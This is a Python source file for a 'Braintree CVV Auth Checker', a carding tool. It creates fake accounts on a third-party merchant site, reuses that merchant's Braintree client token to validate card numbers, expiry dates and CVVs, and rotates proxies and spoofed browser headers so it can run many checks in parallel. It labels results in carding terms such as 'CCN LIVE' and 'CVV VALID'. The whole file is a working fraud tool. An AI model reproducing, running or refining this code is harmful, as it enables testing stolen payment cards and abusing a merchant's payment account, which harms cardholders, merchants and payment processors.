"""
Braintree CVV Auth Checker
Uses direct Braintree API for CVV validation via tokenization.
Uses requests.Session (not httpx) to avoid Client.init() compatibility issues.
"""

import asyncio
import random
import uuid
import base64
import json
from concurrent.futures import ThreadPoolExecutor
from typing import Optional

import requests

executor = ThreadPoolExecutor(max_workers=10)


def generate_random_email() -> str:
    """Generate random email address."""
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    username = ''.join(random.choices(chars, k=10))
    domains = ["gmail.com", "outlook.com", "yahoo.com", "protonmail.com"]
    return f"{username}@{random.choice(domains)}"


def check_braintree_cvv_sync(card: str, mes: str, ano: str, cvv: str, proxy: Optional[str] = None) -> dict:
    """
    Check Braintree CVV authentication via Pixorize.
    Uses requests.Session for compatibility and reliable HTTP.
    
    Args:
        card: Card number
        mes: Expiry month
        ano: Expiry year (2 or 4 digits)
        cvv: CVV code
        proxy: Optional proxy string (e.g. user:pass@ip:port or http://...)
        
    Returns:
        dict with status and response
    """
    session = None
    try:
        # Normalize year
        if len(ano) == 4:
            ano = ano[2:]
        if len(mes) == 1:
            mes = f"0{mes}"
        
        proxies = None
        if proxy and str(proxy).strip():
            px = str(proxy).strip()
            if not px.startswith(("http://", "https://")):
                px = f"http://{px}"
            proxies = {"http": px, "https": px}
        
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "sec-ch-ua": '"Chromium";v="120", "Not/A)Brand";v="24"',
            "sec-ch-ua-platform": '"Android"',
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://pixorize.com",
            "Referer": "https://pixorize.com/",
        })
        
        kw = {"timeout": 60, "allow_redirects": True}
        if proxies:
            kw["proxies"] = proxies
        
        # Step 1: Register user
        email = generate_random_email()
        register_payload = {
            "email": email,
            "password": f"Pass{random.randint(1000, 9999)}!@#",
            "learner_classification": 1,
        }
        r = session.post(
            "https://apitwo.pixorize.com/users/register-simple",
            json=register_payload,
            **kw
        )
        if r.status_code not in (200, 201):
            return {"status": "error", "response": "Registration Failed"}
        
        # Step 2: Get Braintree token
        r = session.get("https://apitwo.pixorize.com/braintree/token", **kw)
        if r.status_code != 200:
            return {"status": "error", "response": "Token Fetch Failed"}
        
        try:
            token_data = r.json()
        except Exception as e:
            return {"status": "error", "response": f"Token JSON parse failed: {str(e)[:25]}"}
        
        payload = token_data.get("payload") if isinstance(token_data, dict) else None
        if not payload:
            return {"status": "error", "response": "No payload in token response"}
        
        client_token = payload.get("clientToken")
        if not client_token:
            return {"status": "error", "response": "No clientToken in payload"}
        
        try:
            decoded = base64.b64decode(client_token).decode("utf-8")
            auth_fingerprint = json.loads(decoded).get("authorizationFingerprint")
        except Exception as e:
            return {"status": "error", "response": f"Token decode failed: {str(e)[:25]}"}
        
        if not auth_fingerprint:
            return {"status": "error", "response": "No authorizationFingerprint in token"}
        
        # Step 3: Tokenize card via Braintree GraphQL
        tokenize_payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "dropin2",
                "sessionId": str(uuid.uuid4()),
            },
            "query": """mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                tokenizeCreditCard(input: $input) {
                    token
                    creditCard {
                        bin
                        brandCode
                        last4
                        expirationMonth
                        expirationYear
                        binData {
                            prepaid
                            healthcare
                            debit
                            commercial
                            issuingBank
                            countryOfIssuance
                        }
                    }
                }
            }""",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": card,
                        "expirationMonth": mes,
                        "expirationYear": f"20{ano}",
                        "cvv": cvv,
                        "billingAddress": {
                            "postalCode": "10001",
                            "streetAddress": "123 Main St",
                            "locality": "New York",
                            "region": "NY",
                            "countryCodeAlpha2": "US",
                        },
                    },
                    "options": {"validate": True},
                }
            },
            "operationName": "TokenizeCreditCard",
        }
        
        bt_headers = {
            "User-Agent": session.headers.get("User-Agent", "Mozilla/5.0 Chrome/120.0"),
            "Content-Type": "application/json",
            "Authorization": f"Bearer {auth_fingerprint}",
            "Braintree-Version": "2018-05-10",
            "Origin": "https://assets.braintreegateway.com",
            "Referer": "https://assets.braintreegateway.com/",
        }
        
        r = session.post(
            "https://payments.braintree-api.com/graphql",
            json=tokenize_payload,
            headers=bt_headers,
            **kw
        )
        
        try:
            data = r.json()
        except Exception:
            return {"status": "error", "response": "Invalid API Response (not JSON)"}
        
        if not isinstance(data, dict):
            return {"status": "error", "response": "Invalid API Response"}
        
        # Check for GraphQL errors
        errors = data.get("errors")
        if errors and isinstance(errors, list):
            err = errors[0] if errors else {}
            error_msg = err.get("message", "Unknown Error") if isinstance(err, dict) else str(err)
            error_upper = str(error_msg).upper()
            
            if any(x in error_upper for x in ("CVV", "CVC", "SECURITY CODE")):
                return {"status": "ccn", "response": "CCN LIVE - Wrong CVV"}
            if any(x in error_upper for x in (
                "DECLINED", "INVALID", "EXPIRED", "DO NOT HONOR",
                "INSUFFICIENT", "LOST", "STOLEN", "FRAUD", "RESTRICTED",
                "NOT PERMITTED", "PICKUP", "REVOKED",
            )):
                return {"status": "declined", "response": f"Declined: {error_msg[:60]}"}
            if any(x in error_upper for x in ("FAILED", "UNABLE", "CANNOT", "BLOCKED")):
                return {"status": "declined", "response": f"Validation Failed: {error_msg[:50]}"}
            return {"status": "error", "response": f"Error: {error_msg[:60]}"}
        
        # Success path
        inner = data.get("data")
        if isinstance(inner, dict):
            tokenize_result = inner.get("tokenizeCreditCard")
            if isinstance(tokenize_result, dict) and tokenize_result.get("token"):
                cc_info = tokenize_result.get("creditCard") or {}
                bin_data = cc_info.get("binData") or {}
                bank = (bin_data.get("issuingBank") or "Unknown")[:20]
                country = bin_data.get("countryOfIssuance") or "Unknown"
                brand = cc_info.get("brandCode") or "Unknown"
                return {
                    "status": "approved",
                    "response": f"CVV VALID ✓ | {brand} | Bank: {bank}",
                }
            return {"status": "declined", "response": "Tokenization Failed - No Token"}
        
        return {"status": "declined", "response": "Unknown Response"}
    
    except requests.exceptions.Timeout:
        return {"status": "error", "response": "Request Timeout"}
    except requests.exceptions.ConnectionError:
        return {"status": "error", "response": "Connection Error"}
    except requests.exceptions.ProxyError:
        return {"status": "error", "response": "Proxy Error"}
    except Exception as e:
        return {"status": "error", "response": f"Error: {str(e)[:50]}"}
    finally:
        if session is not None:
            try:
                session.close()
            except Exception:
                pass


async def async_check_braintree_cvv(
    card: str, 
    mes: str, 
    ano: str, 
    cvv: str, 
    proxy: Optional[str] = None
) -> dict:
    """
    Async wrapper for Braintree CVV checking.
    
    Args:
        card: Card number
        mes: Expiry month
        ano: Expiry year
        cvv: CVV code
        proxy: Optional proxy
        
    Returns:
        dict with status and response
    """
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(
        executor, 
        check_braintree_cvv_sync, 
        card, mes, ano, cvv, proxy
    )
